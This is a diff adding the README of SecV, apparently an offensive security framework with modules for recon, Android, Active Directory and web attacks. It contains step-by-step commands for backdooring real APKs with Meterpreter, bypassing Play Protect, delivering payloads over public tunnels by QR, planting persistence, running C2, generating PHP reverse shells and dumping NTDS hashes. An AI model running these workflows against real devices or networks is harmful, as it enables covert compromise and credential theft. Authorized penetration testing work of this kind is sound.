@@ -1,0 +1,752 @@
+<div align="center">
+
+```
+
+   ███████╗███████╗ ██████╗██╗   ██╗                             
+   ██╔════╝██╔════╝██╔════╝██║   ██║                             
+   ███████╗█████╗  ██║     ██║   ██║                             
+   ╚════██║██╔══╝  ██║     ╚██╗ ██╔╝                             
+   ███████║███████╗╚██████╗ ╚████╔╝                              
+   ╚══════╝╚══════╝ ╚═════╝  ╚═══╝                               
+
+```
+### tauri v2.4.2
+
+`Go` · `Python` · `Bash` · `Rust` · `C++` — one shell, any language
+---
+
+[![Version](https://img.shields.io/badge/v2.4.2-tauri-0d1117?style=flat-square&labelColor=00d9ff&color=0d1117)](https://github.com/SecVulnHub/SecV)
+[![License](https://img.shields.io/badge/MIT-license-0d1117?style=flat-square&labelColor=8b5cf6&color=0d1117)](LICENSE)
+[![Go](https://img.shields.io/badge/Go_1.21+-required-0d1117?style=flat-square&labelColor=00ADD8&color=0d1117)](https://golang.org/)
+[![Platform](https://img.shields.io/badge/Linux%20%7C%20macOS-0d1117?style=flat-square&labelColor=3a3f4b&color=0d1117)](#)
+
+</div>
+
+---
+
+## Overview
+
+SecV is a compiled Go shell that loads and runs security modules written in any language. The loader handles module discovery, JSON I/O, timeouts, dependency checking, and tab completion. You write the logic — in Python, Bash, Go, Rust, C++, whatever works.
+
+```
+secV ❯ use netrecon
+secV (netrecon) ❯ set ports top-100
+secV (netrecon) ❯ run 192.168.1.0/24
+```
+
+---
+
+## Requirements
+
+The installer takes care of most of this automatically. Run `./install.sh` and it figures out your distro and installs what's missing. The table below is for anyone who wants to know exactly what goes where.
+
+**Core**
+
+- Go 1.21+ — compiles the secV binary
+- Python 3.8+ — runs all modules
+- git — CTF repo sync, secV self-update
+
+**Quick install**
+
+```bash
+# Arch
+sudo pacman -S go python python-pip git nmap masscan arp-scan gobuster hydra sshpass nodejs
+
+# Debian / Ubuntu / Kali
+sudo apt install golang-go python3 python3-pip git nmap masscan arp-scan gobuster hydra sshpass nodejs
+
+# Python packages (covers all modules)
+pip3 install requests beautifulsoup4 dnspython scapy psutil netifaces frida-tools objection flask websockets cryptography shodan
+```
+
+**Per-module breakdown**
+
+| Module | System packages | Python packages |
+|--------|----------------|-----------------|
+| `netrecon` | `nmap`, `masscan`, `rustscan`¹, `arp-scan` | `requests`, `scapy`, `shodan` |
+| `android_pentest` | `adb`, `apktool`, `msfvenom`, `qrencode`, `nodejs`, `bore`², `cloudflared`³ | `frida-tools`, `objection`, `flask`, `websockets`, `cryptography` |
+| `ctfpwn` | `nmap`, `gobuster`, `sshpass`, `hydra`, `nodejs` | — |
+| `websec` | `ffuf`⁴, `gobuster`, `msfvenom` (for msf_payload), `tor` (optional) | `requests`, `beautifulsoup4`, `dnspython` |
+| `mac_spoof` | `iproute2` (pre-installed on most distros) | `psutil`, `netifaces` |
+| `wifi_monitor` | `nmap` | `scapy`, `psutil` |
+| `adsec` | `nmap`, `smbclient`, `rpcclient` | `impacket`, `ldap3`, `dnspython` |
+| `ios_pentest` | `libimobiledevice`, `ideviceinstaller` | `requests` |
+
+¹ rustscan: `cargo install rustscan` — or grab a binary from [GitHub releases](https://github.com/RustScan/RustScan/releases)
+
+² bore v0.5.1 (required for WAN mode and bore tunnel fallback):
+```bash
+curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
+```
+
+³ cloudflared: optional, used by `wan_expose`. If it's not installed, the module falls back to bore automatically.
+
+⁴ ffuf: `go install github.com/ffuf/ffuf/v2@latest` — or from [GitHub releases](https://github.com/ffuf/ffuf/releases)
+
+**Optional extras**
+
+- `jadx` — Java decompiler for APK analysis in `android_pentest app_scan`. Grab from [GitHub releases](https://github.com/skylot/jadx/releases).
+- Shodan API key — enriches `netrecon` with Shodan data. `pip3 install shodan`, then `set shodan_key YOUR_KEY`.
+- Tor — enables proxy routing in `websec` via `socks5://127.0.0.1:9050`. `sudo apt install tor && sudo systemctl start tor`.
+
+---
+
+## Installation
+
+```bash
+git clone https://github.com/SecVulnHub/SecV.git
+cd SecV
+chmod +x install.sh && ./install.sh
+```
+
+The installer detects your distro (Arch, Debian, Fedora, Alpine) and installs missing tools using the right package manager. It compiles the Go binary and optionally installs it system-wide.
+
+```bash
+./secV          # from repo directory
+secV            # if installed system-wide
+```
+
+---
+
+## Shell Commands
+
+```
+# Navigation
+show modules          list all available modules
+search <keyword>      search by name or category
+use <module>          load a module
+back                  unload current module
+reload                rescan tools/ directory
+info <module>         module details + dependency status
+
+# Module interaction
+show options          list parameters
+set <key> <value>     assign a parameter
+run <target>          execute against target
+help module           module-specific help
+
+# System
+update                pull latest from git + recompile
+clear                 clear terminal
+exit
+```
+
+Tab completion is active for all commands and module names.
+
+---
+
+## Module Architecture
+
+SecV passes context to modules via **JSON on stdin** and reads results from stdout. There is no framework to import — just read stdin, do your work, write output.
+
+```json
+// stdin → your module
+{
+  "target": "example.com",
+  "params": {
+    "ports": "top-100",
+    "engine": "syn"
+  }
+}
+```
+
+### Python
+
+```python
+#!/usr/bin/env python3
+import json, sys
+
+ctx    = json.loads(sys.stdin.read())
+target = ctx["target"]
+params = ctx.get("params", {})
+
+# your logic
+
+print(json.dumps({"success": True, "data": {"target": target}}))
+```
+
+### Bash
+
+```bash
+#!/usr/bin/env bash
+input=$(cat)
+target=$(echo "$input" | jq -r '.target')
+
+# your logic
+
+jq -n --arg t "$target" '{"success": true, "data": {"target": $t}}'
+```
+
+### `module.json`
+
+Every module needs a manifest alongside its executable:
+
+```json
+{
+  "name":        "my-scanner",
+  "version":     "1.0.0",
+  "category":    "scanning",
+  "description": "Brief description",
+  "author":      "you",
+  "executable":  "python3 scanner.py",
+
+  "dependencies": ["python3", "nmap"],
+  "optional_dependencies": {
+    "scapy": "SYN scan support — pip3 install scapy"
+  },
+
+  "inputs": {
+    "target": { "type": "string",  "required": true },
+    "ports":  { "type": "string",  "default": "1-1000" },
+    "threads":{ "type": "integer", "default": 50 }
+  },
+
+  "timeout": 300
+}
+```
+
+List binary names in `dependencies` (e.g. `adb`, `nmap`) — SecV checks them with `which` and offers to install missing ones using your system's package manager.
+
+Drop your module into `tools/<category>/<name>/` and run `reload`.
+
+---
+
+## Built-in Modules
+
+### `netrecon` — Network Reconnaissance
+
+Concurrent multi-engine network profiling. Runs nmap, masscan, rustscan, and arp-scan simultaneously, merges results, and correlates CVEs against detected services. Detects iOS/Apple devices via port 62078 (lockdownd) and mDNS.
+
+```bash
+use netrecon
+set mode network
+set ports top-100
+run 192.168.1.0/24
+```
+
+---
+
+### `android_pentest` — Android Security Testing
+
+Full-lifecycle Android pentesting suite — from passive recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, and on-device native agent deployment.
+
+| Operation          | Description                                                                       |
+|--------------------|-----------------------------------------------------------------------------------|
+| `recon`            | Device fingerprint, root status, SELinux, chipset                                 |
+| `app_scan`         | APK analysis, manifest audit, security score                                      |
+| `vuln_scan`        | 50+ checks, OWASP Mobile Top 10, NVD live CVEs (incl. MediaTek)                  |
+| `exploit`          | Intent injection, SQLi, content provider attacks                                  |
+| `network`          | Traffic capture, SSL inspection, proxy                                            |
+| `forensics`        | Data extraction, artifact analysis                                                |
+| `frida_hook`       | Deploy frida-server, auto-hook app: SSL unpin, root bypass, cred dump, trace      |
+| `objection_patch`  | Embed Frida gadget via Objection (no root at runtime), repackage and sign APK     |
+| `get_root`         | Multi-vector root: Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU             |
+| `inject_agent`     | Push native recon agent, receive JSON report via TCP C2, auto-escalate            |
+| `adb_wifi`         | Enable ADB over WiFi, drop USB dependency                                         |
+| `deploy_shell`     | Generate + install Meterpreter APK (no root, bypasses settings)                   |
+| `backdoor_apk`     | Pull target APK, inject msfvenom payload (-x template), sign, optionally install  |
+| `rebuild`          | Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore tunnels + QR  |
+| `persist`          | Boot Receiver + Magisk module persistence                                           |
+| `hook`             | Three-vector persistence hook: Magisk service.sh, SharedUID shell, LSPosed/Zygote|
+| `unhook`           | Remove all persistence hooks planted by the hook operation                        |
+| `exploit_cve`      | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, CVE-2024-31317, etc.)  |
+| `cve_chain`        | Run predefined CVE chain: bt_to_root, sandbox_exfil, zero_click_full              |
+| `zero_click`       | Probe zero-click surfaces: Bluetooth HID, NFC, WiFi broadcast, media parsing      |
+| `qr_exploit`       | Generate QR for APK URL, Intent URI, ADB WiFi pairing, deeplink, or **wan** (bore tunnel + detached APK HTTP server, QR = real public WAN URL)|
+| `device_net_scan`  | Scan device WiFi via netrecon, detect exposed ADB TCP and web services            |
+| `wan_expose`       | Expose MSF listener and APK HTTP server via Cloudflare Tunnel; falls back to bore if cloudflared is not installed|
+| `msf_handler`      | Launch Metasploit multi/handler and start msfrpcd for GUI session management      |
+| `full_pwn`         | 7-step chain: recon + adb_wifi + get_root + device_net_scan + shell + persist + WAN|
+| `multi_device`     | Run any operation across all connected devices simultaneously                     |
+| `c2_gui`           | Launch the secV web C2 dashboard (bore tunnels, MSF sessions, QR, ops, logs)     |
+| `c2_cli`           | Launch C2 server in CLI mode (no browser)                                         |
+| `full`             | Full recon + vuln_scan + exploit + network + forensics                            |
+
+**On-device agent** (`tools/mobile/android/agent/`):
+- `secv_agent.sh` - shell script, works on any Android without compilation
+- `secv_agent.c` - compiled ARM64 binary (faster, NDK cross-compile via `build.sh`)
+- `c2_server.py` - standalone TCP+HTTP C2 server with interactive REPL
+
+**APK backdoor tool** (`tools/mobile/android/apk_backdoor/`):
+- `build_bootbuddy.py` - repackage any APK with BootReceiver + AgentService + DexClassLoader chain, WAN C2 via bore tunnels, QR delivery
+
+**C2 web dashboard** (`tools/mobile/android/c2_gui.py`):
+- Sessions tab: live agent callbacks, interact, run shell commands
+- Bore tab: start/stop WAN tunnels, HTTP file server, full C2 stack
+- MSF tab: Meterpreter sessions via msfrpcd, run commands
+- QR tab: generate delivery QR codes for any URL
+- Operations tab: run any android_pentest operation from the browser
+- Logs tab: encrypted .scv session archives with 5-layer password protection
+
+```bash
+# Basic recon via agent
+use android_pentest
+set operation inject_agent
+set agent_mode recon
+run device
+
+# Launch C2 GUI then run rebuild (builds WAN APK, bore tunnels, QR)
+use android_pentest
+set operation rebuild
+set c2_gui true
+run device
+
+# Full exploitation chain with root shell callback
+use android_pentest
+set operation inject_agent
+set agent_mode exploit
+set escalate true
+set lhost 192.168.1.100
+set lport 4444
+run device
+
+# Static APK analysis
+use android_pentest
+set operation app_scan
+set package com.target.app
+run device
+
+# WAN APK delivery via bore tunnel (no port-forwarding required)
+use android_pentest
+set operation qr_exploit
+set mode wan
+set apk_path /tmp/payload.apk   # optional: overrides work_dir glob
+set bore_server bore.pub        # default, can omit
+run no_device
+# Spawns detached HTTP server + bore tunnel, prints QR encoding
+# http://bore.pub:<assigned-port>/payload.apk
+
+# WAN expose with bore fallback (cloudflared → bore auto-fallback)
+use android_pentest
+set operation wan_expose
+set lport 4444
+set serve_port 8888
+run connected
+```
+
+**bore install** (v0.5.1, required for wan mode and bore fallback):
+```bash
+curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
+```
+
+**Play Protect Bypass:**
+
+A raw `deploy_shell` APK (`com.metasploit.stage`) is flagged by every AV engine and Play Protect on install. Two bypass options:
+
+| Option | Operation | Detection | Requires |
+|--------|-----------|-----------|----------|
+| Template injection | `backdoor_apk` | Medium — preserved package name, real icon | A legitimate APK file |
+| DexClassLoader chain | `rebuild` | Low — no static Meterpreter bytecode in APK | bore tunnel for runtime DEX delivery |
+
+```bash
+# Option 1 — inject into a real APK (preserves package name + icon)
+use android_pentest
+set operation backdoor_apk
+set package com.example.calculator   # app installed on device
+# or: set apk_path /tmp/calc.apk    # skip device pull, use local file
+set lhost 161.35.110.36              # bore.pub resolved IP
+set lport 41736                      # bore MSF tunnel port
+run connected
+# Delivers: calculator_backdoored_signed.apk
+
+# Then serve via WAN QR:
+set operation qr_exploit
+set mode wan
+set apk_path /path/to/calculator_backdoored_signed.apk
+run no_device
+
+# Option 2 — DexClassLoader stub (no static payload in APK at all)
+use android_pentest
+set operation rebuild
+set apk_path /tmp/base.apk
+set bore_dex_port 21062   # bore.pub:21062 → HTTP server serving s.dex
+set bore_msf_port 37993   # bore.pub:37993 → MSF handler :4444
+run connected
+```
+
+---
+
+### `ctfpwn` — CTF Autopwn
+
+Syncs `github.com/0xb0rn3/CTFs`, lists all rooms sorted newest first, and runs standalone autopwn scripts against a target machine. Auto-detects the latest CTF, extracts flags from output (THM{}/HTB{} patterns), and saves everything to `~/ZX01C/CTF/<room>/`.
+
+| Operation | Description |
+|-----------|-------------|
+| `list`    | List all CTFs sorted newest first (auto-pulls latest) |
+| `pull`    | Clone/update repo + mirror all rooms to `~/ZX01C/CTF/` |
+| `latest`  | Show newest CTF; if target IP given, run its autopwn script |
+| `run`     | Run a specific room's autopwn script against target IP |
+| `info`    | Show README/writeup for a room |
+| `search`  | Full-text search across room names, writeups, and scripts |
+
+| Parameter  | Default | Description |
+|------------|---------|-------------|
+| `operation`| `list`  | Operation to run |
+| `ctf`      | —       | Room name (case-insensitive, partial match) |
+| `platform` | `THM`   | `THM` \| `HTB` \| `ALL` |
+| `query`    | —       | Search term for `search` operation |
+
+```bash
+# List all CTFs
+use ctfpwn
+set operation list
+run none
+
+# Run latest CTF against target
+use ctfpwn
+set operation latest
+run 10.10.85.42
+
+# Run specific room
+use ctfpwn
+set operation run
+set ctf simplectf
+run 10.10.85.42
+
+# Search by technique
+use ctfpwn
+set operation search
+set query ssti
+run none
+```
+
+**Rooms** (25 THM, HTB coming): `Biohazard`, `AttacktiveDirectory`, `UltraTech`, `Blog`, `0day`, `Dogcat`, `Ghizer`, `Relevant`, `Wgel`, `Wonderland`, `Cheese-CTF`, `Year of the pig`, `Rabbit_Store`, `Silver_Platter`, `crypto_failures`, `sticker_shop`, `chill-hack`, `W1seGuy`, `agent_sudo`, `bounty_hacker`, `Hidden_Deep_Into_My_Heart`, `VulnNet-Internal`, `pickle-rick`, `simplectf`, `rootmeCTF`
+
+**Output:** `~/ZX01C/CTF/<room>/` — includes copied scripts, README, and timestamped run log.
+
+---
+
+### `ios_pentest` — iOS Security Testing
+
+Connects via libimobiledevice. Checks security posture, installed apps, jailbreak indicators, entitlements, and ATS configuration. Runs live NVD keyword searches for iOS-version-specific CVEs. Covers non-jailbroken and jailbroken assessment paths.
+
+```bash
+use ios_pentest
+set operation recon
+run device
+```
+
+---
+
+### `mac_spoof` — MAC Address Rotation
+
+Per-interface background daemons with locally-administered address generation, configurable rotation interval, and state persistence. Vendor spoofing lets you pick an OUI prefix from real hardware (Apple, Samsung, Intel, Cisco, Dell) so your address looks like a legitimate device on the network.
+
+| Action | Description |
+|--------|-------------|
+| `start` | Start rotation daemon for the selected interface |
+| `stop` | Kill daemon and restore original MAC from state |
+| `status` | Show current MAC, original MAC, PID, uptime, and rotation count |
+| `restore` | Restore the original MAC without killing a running daemon |
+| `history` | Show the rotation log for the interface |
+| `vendor` | Spoof as a real vendor using OUI prefix + random suffix |
+
+| Parameter    | Default | Description |
+|-------------|---------|-------------|
+| `iface`     | —       | Interface name, comma-separated list, or omit with `all_up true` |
+| `all_up`    | `false` | Auto-select all non-loopback interfaces that are UP |
+| `action`    | `start` | Action to run (see table above) |
+| `interval`  | `0.5`   | Seconds between MAC rotations |
+| `dry_run`   | `false` | Preview changes without applying |
+| `vendor`    | —       | Vendor name: `apple`, `samsung`, `intel`, `cisco`, `dell` |
+| `stealth`   | `false` | Only rotate on disconnect events instead of a fixed interval |
+| `persistent`| `false` | Write a systemd user service so the daemon starts on login |
+
+```bash
+sudo secV
+use mac_spoof
+set iface wlan0
+set interval 300
+run localhost
+
+# spoof as Apple hardware
+use mac_spoof
+set iface wlan0
+set action vendor
+set vendor apple
+run localhost
+```
+
+---
+
+### `wifi_monitor` — Smart WiFi Monitor
+
+Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, device fingerprinting (IoT, router, NAS, database server), CVE lookup via CIRCL API, and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.
+
+```bash
+sudo secV
+use wifi_monitor
+run 192.168.1.0/24
+```
+
+---
+
+### `adsec` — Active Directory Security Assessment
+
+Single-tool, full-chain AD pentest: unauthenticated discovery, user/group/share/passpol enumeration, Kerberoasting, AS-REP roasting, lockout-aware password spraying, BloodHound collection, vuln checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota, ADCS), share looting (GPP cpassword, KeePass, SSH keys, unattend.xml), and SAM/LSA/NTDS extraction. Pure-Python fallbacks via `impacket` + `ldap3` mean it works without dozens of external CLIs.
+
+| Operation     | Auth required           | What it does                                                          |
+|---------------|-------------------------|-----------------------------------------------------------------------|
+| `discover`    | none                    | DC fingerprint, domain SID, OS, NetBIOS, anonymous SMB/LDAP probing  |
+| `users`       | none / low-priv         | LDAP user enum + SAMR RID brute fallback                              |
+| `groups`      | low-priv                | Domain group enumeration with members                                 |
+| `shares`      | none / low-priv         | Share inventory with READ/WRITE permission tests                      |
+| `passpol`     | none                    | Domain password policy via SAMR                                       |
+| `kerberoast`  | low-priv                | TGS hash dump for SPN-bearing accounts (hashcat -m 13100)             |
+| `asreproast`  | none (just userlist)    | AS-REP hash dump for users without preauth (hashcat -m 18200)         |
+| `spray`       | userlist                | Lockout-aware password spraying via SMB                               |
+| `vulncheck`   | none                    | Zerologon, PetitPotam, NoPac, MAQ, SMBv1, SMB signing, ADCS detection |
+| `bloodhound`  | low-priv                | BloodHound JSON zip via bloodhound-python                             |
+| `loot`        | low-priv                | Sensitive file search across readable shares                          |
+| `secrets`     | DA / local-admin        | secretsdump SAM/LSA/NTDS via impacket                                 |
+| `auto`        | varies                  | Full safe pipeline with whatever context is available                 |
+
+```bash
+secV ❯ use adsec
+secV (adsec) ❯ set operation discover
+secV (adsec) ❯ run 192.168.1.50
+
+# AS-REP roast — no creds, just a userlist:
+secV (adsec) ❯ set operation asreproast
+secV (adsec) ❯ set domain corp.local
+secV (adsec) ❯ set userlist /tmp/users.txt
+secV (adsec) ❯ run 192.168.1.50
+
+# Pass-the-hash NTDS dump (DA required):
+secV (adsec) ❯ set operation secrets
+secV (adsec) ❯ set domain corp.local
+secV (adsec) ❯ set username admin
+secV (adsec) ❯ set hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+secV (adsec) ❯ run 192.168.1.50
+```
+
+Lockout safety is on by default — `safe_spray=true` pulls password policy first and leaves a 2-attempt buffer below the lockout threshold. `krbtgt`, `Administrator`, and `Guest` are excluded from sprays automatically. All hashes go to `output_dir` (default `./adsec-loot`) and are never logged to stdout.
+
+---
+
+### `websec` — Web Offensive Tool
+
+Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS, cookies, directory brute-force, error-based + time-blind SQLi (with WAF evasion variants), reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, WordPress attack surface, WAF fingerprinting, web spidering, and Google dorks. Built-in stealth layer: UA rotation across 20 real browser strings, full Sec-Fetch-* browser headers, configurable delay/jitter, proxy/Tor routing. Authenticated scanning via cookies/custom headers.
+
+| Operation        | Description                                                             |
+|------------------|-------------------------------------------------------------------------|
+| `recon`          | DNS, WHOIS, SSL cert, robots.txt, Wayback Machine, tech stack           |
+| `headers`        | Security headers audit (HSTS, CSP, X-Frame-Options, etc.)              |
+| `cors`           | CORS: wildcard, origin reflection, credentials misconfig                |
+| `cookies`        | Cookie flag audit: Secure, HttpOnly, SameSite                           |
+| `dirs`           | Directory brute-force with 100+ built-in paths + custom wordlist        |
+| `sqli`           | Error-based + time-blind SQLi; WAF-evasion variants via `waf_evasion`  |
+| `xss`            | Reflected XSS; WAF-evasion variants via `waf_evasion`                  |
+| `csrf`           | CSRF token detection across homepage + common form paths                |
+| `bypass_403`     | 403 bypass via header injection and path manipulation                   |
+| `open_redirect`  | Open redirect via 12+ common redirect parameter names                   |
+| `framework_cves` | Jira/AEM/Confluence CVE path probing (15+ known CVE paths)             |
+| `file_upload`    | File upload form and endpoint detection                                  |
+| `rate_limit`     | Rate limit enforcement check (10 rapid requests)                        |
+| `spider`         | Crawl site breadth-first, map URLs, forms, JS files                     |
+| `dork`           | Generate 18+ Google dork queries + OSINT resource links                 |
+| `ssl`            | SSL/TLS: version, cipher suites, cert details, expiry                   |
+| `waf`            | WAF fingerprinting: Cloudflare, AWS, ModSecurity, Akamai, Imperva, F5  |
+| `wordpress`      | WP attack surface: user enum (REST+author), xmlrpc, plugins, version   |
+| `stealth`        | Show stealth config, print live headers, test proxy reachability        |
+| `php_payload`    | PHP reverse shell, webshell, cmd page, or obfuscated payload           |
+| `msf_payload`    | msfvenom web payloads (php/war/jsp/aspx) and a matching handler.rc     |
+| `fuzz`           | Directory/path fuzzing with ffuf, gobuster, or dirbuster (auto-picked) |
+| `burp_export`    | Raw HTTP request capture, Burp scope JSON, intruder payload list        |
+| `full`           | All checks in one pass                                                  |
+
+**Stealth parameters:**
+
+| Parameter     | Default | Description                                                   |
+|---------------|---------|---------------------------------------------------------------|
+| `stealth`     | false   | UA rotation + full browser headers on every request           |
+| `rotate_ua`   | false   | Rotate UA per request (auto-enabled with `stealth true`)      |
+| `delay`       | 0       | Fixed delay in seconds between requests                       |
+| `jitter`      | 0       | Random 0–N second offset added to each delay                  |
+| `proxy`       | —       | Proxy URL: `http://host:port` or `socks5://host:port`         |
+| `waf_evasion` | false   | Obfuscated SQLi/XSS payload variants to bypass WAF signatures |
+
+**Payload parameters (php_payload / msf_payload):**
+
+| Parameter      | Default | Description |
+|----------------|---------|-------------|
+| `php_type`     | `reverse` | PHP payload type: `reverse`, `webshell`, `cmd`, `obfuscated`, `all` |
+| `lhost`        | —       | Your listener IP |
+| `lport`        | `4444`  | Your listener port |
+| `php_obfuscate`| `false` | Layer base64/chr/hex obfuscation on top of the chosen type |
+| `payload_type` | `php/meterpreter/reverse_tcp` | msfvenom payload string |
+| `format`       | `raw`   | msfvenom format: `raw`, `war`, `jsp`, `aspx` |
+
+**Fuzz parameters:**
+
+| Parameter     | Default   | Description |
+|---------------|-----------|-------------|
+| `wordlist`    | built-in  | Path to a custom wordlist |
+| `threads`     | `40`      | Concurrent threads |
+| `extensions`  | —         | File extensions to try, e.g. `php,html,txt` |
+| `fuzz_engine` | auto      | Force a specific tool: `ffuf`, `gobuster`, `dirbuster` |
+
+```bash
+# SQLi with stealth + Tor + WAF evasion
+use websec
+set stealth true
+set proxy socks5://127.0.0.1:9050
+set delay 0.5
+set jitter 1.5
+set waf_evasion true
+set operation sqli
+set test_url https://example.com/search?q=test
+run https://example.com
+
+# WordPress attack surface
+use websec
+set operation wordpress
+run https://example.com
+
+# 403 bypass
+use websec
+set operation bypass_403
+set bypass_path /admin
+run https://example.com
+```
+
+---
+
+## `gen_module.py` — Module JSON Generator
+
+Auto-generates `module.json` by scanning your source for `params.get()`, `argparse`, and Bash `jq .params.X` patterns. Infers types, defaults, and required flags.
+
+```bash
+# Generate and print
+python3 gen_module.py tools/network/my-tool/
+
+# Write module.json into the tool directory
+python3 gen_module.py tools/network/my-tool/ --write
+
+# Merge newly detected params into an existing hand-written module.json
+python3 gen_module.py tools/network/my-tool/ --update
+```
+
+Fill in `help.parameters[*].description` and `help.examples` manually — the generator leaves those empty since they require human context.
+
+---
+
+## Module Development
+
+```bash
+mkdir -p tools/scanning/my-tool && cd tools/scanning/my-tool
+
+cat > module.json << 'EOF'
+{
+  "name": "my-tool",
+  "version": "1.0.0",
+  "category": "scanning",
+  "description": "Does a thing",
+  "author": "you",
+  "executable": "python3 main.py",
+  "dependencies": ["python3"],
+  "inputs": {
+    "target": { "type": "string", "required": true }
+  },
+  "timeout": 60
+}
+EOF
+
+cat > main.py << 'EOF'
+#!/usr/bin/env python3
+import json, sys
+ctx = json.loads(sys.stdin.read())
+# your logic here
+print(json.dumps({"success": True, "data": {"target": ctx["target"]}}))
+EOF
+
+chmod +x main.py
+```
+
+Test:
+
+```bash
+cd ../../..
+./secV
+secV ❯ reload
+secV ❯ use my-tool
+secV (my-tool) ❯ run example.com
+```
+
+**Before opening a PR:**
+
+- [ ] Works without optional dependencies (graceful degradation)
+- [ ] `module.json` is valid JSON with all required fields
+- [ ] `README.md` inside the module directory
+- [ ] Handles errors — no unhandled exceptions to stdout
+- [ ] Lists binary names (not package names) in `dependencies`
+
+---
+
+## Update System
+
+SecV pulls from `https://github.com/secvulnhub/SecV.git`. On update it stashes local changes, pulls, recompiles the binary if `main.go` changed, and installs Python deps if `requirements.txt` changed.
+
+```bash
+secV ❯ update                      # interactive update
+
+python3 update.py                  # check and apply
+python3 update.py --status         # component status
+python3 update.py --verify         # integrity check
+python3 update.py --repair         # fix common issues
+python3 update.py --rollback       # restore last backup
+python3 update.py --sync-tools     # fix module script permissions
+```
+
+---
+
+## Troubleshooting
+
+**Module not found after adding**
+```bash
+secV ❯ reload
+```
+
+**Permission denied**
+```bash
+chmod +x secV install.sh
+```
+
+**Go binary won't compile**
+```bash
+sudo pacman -S go          # Arch
+sudo apt install golang    # Debian/Ubuntu
+brew install go            # macOS
+
+cd /path/to/SecV
+go mod tidy
+go build -o secV .
+```
+
+**Update fails with merge conflict**
+```bash
+git stash && git pull && git stash pop
+python3 update.py --rollback   # or restore backup
+```
+
+---
+
+## Legal
+
+SecV is for **authorized security testing only.** You must have explicit written permission before scanning or testing any system you do not own.
+
+Unauthorized use may violate computer fraud statutes. The authors accept no liability for misuse.
+
+---
+
+## License
+
+MIT © 2024–2026 SecVulnHub
+
+---
+
+<div align="center">
+
+**SecV** · tauri · built by 0xb0rn3
+
+</div>
